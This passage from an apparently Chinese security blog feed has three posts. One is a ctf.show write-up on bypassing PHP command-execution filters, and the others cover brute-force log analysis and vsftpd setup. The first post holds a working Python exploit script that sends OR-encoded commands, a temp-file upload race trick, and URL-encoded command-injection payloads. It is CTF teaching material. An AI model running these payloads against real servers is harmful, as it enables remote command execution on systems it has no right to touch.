class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;D:\phpstudy_pro\Extensions\php\php8.0.2nts\php.exe rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210912154142359.png" alt="image-20210912154142359"></p><h3 id="POST上传条件竞争-没有过滤"><a href="#POST上传条件竞争-没有过滤" class="headerlink" title="POST上传条件竞争 没有过滤."></a>POST上传条件竞争 没有过滤<code>.</code></h3><p>发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母</p><p>使用通配符<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code></p><p>因为我们上传重名的文件存在大写，即构造匹配最后一位大写字母，即可过滤linux文件中全部小写的文件。在ascii码表中，可见大写字母位于<code>@</code>与<code>[</code>之间</p><p><code>.%20/*/????????[@-[]</code></p><p>创建<code>test.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://9a634e82-0c97-423d-b9ff-ca0e27b3ad8d.challenge.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913193458716.png" alt="image-20210913193458716"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913193254558.png" alt="image-20210913193254558"></p><p>添加需要执行的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913193303877.png" alt="image-20210913193303877"></p><mark class="hl-label orange">注意</mark> <h2 id="不显示返回结果"><a href="#不显示返回结果" class="headerlink" title="不显示返回结果"></a>不显示返回结果</h2><h3 id="gt-dev-null-2-gt-amp-1绕过"><a href="#gt-dev-null-2-gt-amp-1绕过" class="headerlink" title="\&gt;/dev/null 2&gt;&amp;1绕过"></a><code>\&gt;/dev/null 2&gt;&amp;1</code>绕过</h3><p><code>ls;ls</code>或<code>ls||ls</code> 双写绕过，把第二个命令写入到<code>/dev/null</code>中去。</p><p><code>?c=tac flag.php%26%26ls</code> <code>&amp;&amp;</code>需要用url编码。</p><p><code>?c=nl flag.php%0a</code> <code>%0a</code>截断</p><h2 id="中断缓冲区"><a href="#中断缓冲区" class="headerlink" title="中断缓冲区"></a>中断缓冲区</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><p><code>include(&#39;/flag.txt&#39;);exit(0);</code>或<code>exit();</code>或<code>exit;</code></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><code>tac</code> 从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主机暴力破解日志特征</title>
      <link href="/p/75bed629.html"/>
      <url>/p/75bed629.html</url>
      
        <content type="html"><![CDATA[<h2 id="FTP-21端口"><a href="#FTP-21端口" class="headerlink" title="FTP(21端口)"></a>FTP(21端口)</h2><h3 id="匿名登录"><a href="#匿名登录" class="headerlink" title="匿名登录"></a>匿名登录</h3><p><code>cat /var/log/vsftpd.log | grep &#39;anonymous&#39;| grep &#39;PASS &lt;password&gt;&#39;</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908145529547.png" alt="image-20210908145529547"></p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>查看暴力破解记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/vsftpd.log | grep &#x27;530&#x27;</span><br></pre></td></tr></table></figure><p>查看ip尝试次数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/vsftpd.log | awk &#x27;/530/&#123;print $(NF-3)&#125;&#x27; |sort|uniq -c|sort -k 1 -rn</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908153214081.png" alt="image-20210908153214081"></p><p>查看可疑ip是否登录成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/vsftpd.log | grep &#x27;230&#x27; | grep &#x27;192.168.79.132&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Wed Sep  8 22:22:15 2021 [pid 342022] [longer] FTP response: Client &quot;192.168.79.132&quot;, &quot;230 Login successful.&quot;</span><br></pre></td></tr></table></figure><p>查看上传下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tue Sep  7 16:07:29 2021 1 ::ffff:192.168.79.132 0 /test/testfile.txt a _ o a anonymous ftp 0 * c</span><br><span class="line">Tue Sep  7 17:27:27 2021 1 192.168.79.132 0 /test_ftp.txt a _ i r longer ftp 0 * i</span><br></pre></td></tr></table></figure><p>windows下成功登录</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909095642142.png" alt="image-20210909095642142"></p><p>上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021-09-09 02:02:33 192.168.79.132 - 192.168.77.175 21 STOR test.exe 226 0 0 399fdf8e-2a13-4105-b8ad-20048579c070 /test.exe</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021-09-09 02:14:01 192.168.79.132 - 192.168.77.175 21 RETR 123.txt 226 0 0 1ac045c4-5b7a-44f9-95cc-f0e47e079fc5 /test/123.txt</span><br></pre></td></tr></table></figure><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><code>/var/log/secure</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907143236260.png" alt="image-20210907143236260"></p><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><p>linux 日志位置：<code>/var/log/secure</code></p><p>成功登录的日志 特征词<code>LOGIN ON</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909161004322.png" alt="image-20210909161004322"></p><p>失败登录日志 <code>FAILED LOGIN</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909161821753.png" alt="image-20210909161821753"></p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210910101048477.png" alt="image-20210910101048477"></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTP服务器</title>
      <link href="/p/92957adc.html"/>
      <url>/p/92957adc.html</url>
      
        <content type="html"><![CDATA[<h2 id="linxux-ftp"><a href="#linxux-ftp" class="headerlink" title="linxux_ftp"></a>linxux_ftp</h2><h3 id="安装-amp-运行"><a href="#安装-amp-运行" class="headerlink" title="安装&amp;运行"></a>安装&amp;运行</h3><p>yum</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install vsftpd</span><br></pre></td></tr></table></figure><p>开机自启&amp;启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable vsftpd.service</span><br><span class="line">systemctl start vsftpd.service</span><br></pre></td></tr></table></figure><p>查看监听端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antup | grep ftp</span><br></pre></td></tr></table></figure><h3 id="配置vsftpd"><a href="#配置vsftpd" class="headerlink" title="配置vsftpd"></a>配置vsftpd</h3><p>为FTP服务创建一个Linux用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser ftptest</span><br></pre></td></tr></table></figure><p>修改用户密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd ftptest</span><br></pre></td></tr></table></figure><p>创建一个供FTP服务使用的文件目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/ftp/test</span><br></pre></td></tr></table></figure><p>创建测试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /var/ftp/test/testfile.txt</span><br></pre></td></tr></table></figure><p>更改<code>/var/ftp/test</code>目录的拥有者为<strong>ftptest</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R ftptest:ftptest /var/ftp/test</span><br></pre></td></tr></table></figure><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure><blockquote><p>如果使用的是<code>apt install vsftpd</code>安装命令，则配置文件路径为/etc/vsftpd.conf</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#除下面提及的参数，其他参数保持默认值即可。</span><br><span class="line"></span><br><span class="line">#修改下列参数的值：</span><br><span class="line">#禁止匿名登录FTP服务器。</span><br><span class="line">anonymous_enable=NO</span><br><span class="line">#允许本地用户登录FTP服务器。</span><br><span class="line">local_enable=YES</span><br><span class="line">#监听IPv4 sockets。</span><br><span class="line">listen=YES</span><br><span class="line"></span><br><span class="line">#在行首添加#注释掉以下参数：</span><br><span class="line">#关闭监听IPv6 sockets。</span><br><span class="line">#listen_ipv6=YES</span><br><span class="line"></span><br><span class="line">#在配置文件的末尾添加下列参数：</span><br><span class="line">#设置本地用户登录后所在目录。</span><br><span class="line">local_root=/var/ftp/test</span><br><span class="line">#全部用户被限制在主目录。</span><br><span class="line">chroot_local_user=YES</span><br><span class="line">#启用例外用户名单。</span><br><span class="line">chroot_list_enable=YES</span><br><span class="line">#指定例外用户列表文件，列表中用户不被锁定在主目录。</span><br><span class="line">chroot_list_file=/etc/vsftpd/chroot_list</span><br><span class="line">#开启被动模式。</span><br><span class="line">pasv_enable=YES</span><br><span class="line">allow_writeable_chroot=YES</span><br><span class="line">#本教程中为Linux实例的公网IP。</span><br><span class="line">pasv_address=&lt;FTP服务器公网IP地址&gt;</span><br><span class="line">#设置被动模式下，建立数据传输可使用的端口范围的最小值。</span><br><span class="line">#建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。</span><br><span class="line">pasv_min_port=&lt;port number&gt;</span><br><span class="line">#设置被动模式下，建立数据传输可使用的端口范围的最大值。</span><br><span class="line">pasv_max_port=&lt;port number&gt;</span><br></pre></td></tr></table></figure><p>chroot_list文件，并在文件中写入例外用户名单</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/vsftpd/chroot_list</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart vsftpd.service</span><br></pre></td></tr></table></figure><p>/etc/vsftpd目录下文件说明如下：</p><ul><li>/etc/vsftpd/vsftpd.conf是vsftpd的核心配置文件。</li><li>/etc/vsftpd/ftpusers是黑名单文件，此文件中的用户不允许访问FTP服务器。</li><li>/etc/vsftpd/user_list是白名单文件，此文件中的用户允许访问FTP服务器。</li></ul><h4 id="用户登录控制参数说明"><a href="#用户登录控制参数说明" class="headerlink" title="用户登录控制参数说明"></a>用户登录控制参数说明</h4><table><thead><tr><th align="left">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">anonymous_enable=YES</td><td align="left">接受匿名用户</td></tr><tr><td align="left">no_anon_password=YES</td><td align="left">匿名用户login时不询问口令</td></tr><tr><td align="left">anon_root=（none）</td><td align="left">匿名用户主目录</td></tr><tr><td align="left">local_enable=YES</td><td align="left">接受本地用户</td></tr><tr><td align="left">local_root=（none）</td><td align="left">本地用户主目录</td></tr></tbody></table><h4 id="用户权限控制参数说明"><a href="#用户权限控制参数说明" class="headerlink" title="用户权限控制参数说明"></a>用户权限控制参数说明</h4><table><thead><tr><th align="left">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">write_enable=YES</td><td align="left">可以上传文件（全局控制）</td></tr><tr><td align="left">local_umask=022</td><td align="left">本地用户上传的文件权限</td></tr><tr><td align="left">file_open_mode=0666</td><td align="left">上传文件的权限配合umask使用</td></tr><tr><td align="left">anon_upload_enable=NO</td><td align="left">匿名用户可以上传文件</td></tr><tr><td align="left">anon_mkdir_write_enable=NO</td><td align="left">匿名用户可以建目录</td></tr><tr><td align="left">anon_other_write_enable=NO</td><td align="left">匿名用户修改删除</td></tr><tr><td align="left">chown_username=lightwiter</td><td align="left">匿名上传文件所属用户名</td></tr></tbody></table><h3 id="出现问题"><a href="#出现问题" class="headerlink" title="出现问题"></a>出现问题</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907203159011.png" alt="image-20210907203159011"></p><p>解决方法禁用<code>SELinux</code></p><p>暂时禁用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">setenforce Permissive</span><br></pre></td></tr></table></figure><p>永久禁用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure><p><strong>打开ftp服务器上的文件夹时发生错误，请检查是否有权限访问该文件夹</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210907202342604.png" alt="image-20210907202342604"></p><p>解决方法：打开 “网络和共享中心”，找到“Internet选项” –&gt;【高级】这页，取消掉“使用被动FTP(用于防火墙和DSL调制解调器的兼容)”</p><h2 id="windows-ftp"><a href="#windows-ftp" class="headerlink" title="windows_ftp"></a>windows_ftp</h2><p><a href="https://www.jianshu.com/p/7d7d2a0d3deb">Windows server 2016 FTP服务器的搭建</a></p><h2 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>!</td><td>在本地机中执行交互shell，exit回到ftp环境</td></tr><tr><td>dir</td><td>显示远程计算机上的目录文件和子目录列表</td></tr><tr><td>cd</td><td>指定要更改的远程计算机上的目录</td></tr><tr><td>lcd</td><td>更改本地计算机上的工作目录。默认情况下，工作目录是启动 <strong>ftp</strong> 的目录</td></tr><tr><td>get</td><td>使用当前文件传输类型将远程文件复制到本地计算机。</td></tr><tr><td>open</td><td>与指定的 FTP 服务器连接</td></tr><tr><td>put/send</td><td>使用当前文件传输类型将本地文件复制到远程计算机上</td></tr></tbody></table><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>默认情况下，Vsftp不单独记录日志，也就是说不会输出到一个单独的文件中存储，而是统一存放到<code>/var/log/messages</code>文件中。</p><p>常见解决方案</p><ol><li>xferlog_enable=YES </li><li>xferlog_std_format=YES </li><li>xferlog_file=/var/log/xferlog  </li><li>dual_log_enable=YES </li><li>vsftpd_log_file=/var/log/vsftpd.log</li></ol><p>在配置文件中启用<code>xferlog_enable=YES</code>，它表示将客户机登录服务器后上传或下载的文件具体信息记录。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908112713651.png" alt="image-20210908112713651"></p><p><code>xferlog_std_format=YES</code> 传输日志文件将以标准 xferlog 的格式书写，该格式的日志文件默认为 <code>/var/log/xferlog</code></p><p><code>dual_log_enable=YES</code>，它表示启用双份日志，将生成两个相似的日志文件，默认在 <code>/var/log/xferlog</code> 和 <code>/var/log/vsftpd.log</code> 目录下。前者是 wu-ftpd 类型的传输日志，可以利用标准日志工具对其进行分析；后者是Vsftpd类型的日志。</p><p><code>syslog_enable</code>原本应该输出到<code>/var/log/vsftpd.log</code>中的日志，将输出到系统日志中。</p><h4 id="vsftpd-log"><a href="#vsftpd-log" class="headerlink" title="vsftpd.log"></a>vsftpd.log</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908113502525.png" alt="image-20210908113502525"></p><blockquote><p>日志仅反映了部分Ftp登录情况：例如登录IP地址、用户名</p></blockquote><p>成功登录标识</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wed Sep  8 21:02:29 2021 [pid 340294] [longer] FTP command: Client &quot;192.168.79.132&quot;, &quot;PASS &lt;password&gt;&quot;</span><br><span class="line">Wed Sep  8 21:02:29 2021 [pid 340293] [longer] OK LOGIN: Client &quot;192.168.79.132&quot;</span><br></pre></td></tr></table></figure><h4 id="Xferlog"><a href="#Xferlog" class="headerlink" title="Xferlog"></a>Xferlog</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wed Sep  8 19:08:51 2021 1 ::ffff:192.168.79.132 0 /test_ftp.txt a _ o r longer ftp 0 * c</span><br><span class="line">Wed Sep  8 21:03:00 2021 1 192.168.79.132 0 /testfile.txt a _ o r longer ftp 0 * c</span><br></pre></td></tr></table></figure><table><thead><tr><th>记录</th><th>含义</th></tr></thead><tbody><tr><td>Tue Sep  7 15:35:57 2021</td><td>FTP传输时间</td></tr><tr><td>1</td><td>传输文件所用时间。单位/秒</td></tr><tr><td>192.168.79.132</td><td>ftp客户端名称/IP</td></tr><tr><td>0</td><td>传输文件大小。单位/Byte</td></tr><tr><td>/testfile.txt</td><td>传输文件名，包含路径</td></tr><tr><td>a</td><td>传输方式： a以ASCII方式传输; b以二进制(binary)方式传输;</td></tr><tr><td>_</td><td>特殊处理标志位：”_”不做任何处理；”C”文件是压缩格式；”U”文件非压缩格式；”T”文件是tar格式；</td></tr><tr><td>o</td><td>传输方向：”i”上传；”o”下载；</td></tr><tr><td>r</td><td>用户访问模式：“a”匿名用户；”g”访客模式；”r”系统中用户;</td></tr><tr><td>longer</td><td>登录用户名</td></tr><tr><td>ftp</td><td>服务名称，一般都是ftp</td></tr><tr><td>0</td><td>认证方式：”0”无；”1”RFC931认证；</td></tr><tr><td>*</td><td>认证用户id，”*”表示无法获取id</td></tr><tr><td>c</td><td>完成状态：”i”传输未完成；”c”传输已完成；</td></tr></tbody></table><blockquote><p>为啥会出现<code>::ffff:</code>，因为之前<code>vsftpd.conf</code>中默认<code>listen=YES</code>，<code>#listen_ipv6=YES</code>这个忘记注释掉。</p><p>IPv4 映射的 IPv6 地址使用此替代格式。此类型的地址用于将 IPv4 节点表示为 IPv6 地址。它允许 IPv6 应用程序直接与 IPv4 应用程序通信。例如，<code>0:0:0:0:0:ffff:192.1.56.10</code> 和 <code>::ffff:192.1.56.10/96</code>（短格式）。</p></blockquote><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h4><p><code>win+r</code> ,输入<code>inetmgr</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908174120348.png" alt="image-20210908174120348"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210908174347526.png" alt="image-20210908174347526"></p><h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 10.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2021-09-08 09:21:23</span><br><span class="line">#Fields: date time c-ip cs-username s-ip s-port cs-method cs-uri-stem sc-status sc-win32-status sc-substatus x-session x-fullpath</span><br><span class="line">2021-09-08 09:21:23 192.168.79.132 - 192.168.77.175 21 ControlChannelOpened - - 0 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br><span class="line">2021-09-08 09:21:23 192.168.79.132 - 192.168.77.175 21 OPTS UTF8+ON 200 0 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br><span class="line">2021-09-08 09:21:30 192.168.79.132 - 192.168.77.175 21 USER anonymous 331 0 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br><span class="line">2021-09-08 09:21:32 192.168.79.132 - 192.168.77.175 21 PASS eeee 230 0 0 ab78edb1-c781-42ff-8056-24cc80701847 /</span><br><span class="line">2021-09-08 09:23:42 192.168.79.132 - 192.168.77.175 21 ControlChannelClosed - - 258 0 ab78edb1-c781-42ff-8056-24cc80701847 -</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909095011088.png" alt="image-20210909095011088"></p><h2 id="FTP状态码"><a href="#FTP状态码" class="headerlink" title="FTP状态码"></a>FTP状态码</h2><h3 id="常用"><a href="#常用" class="headerlink" 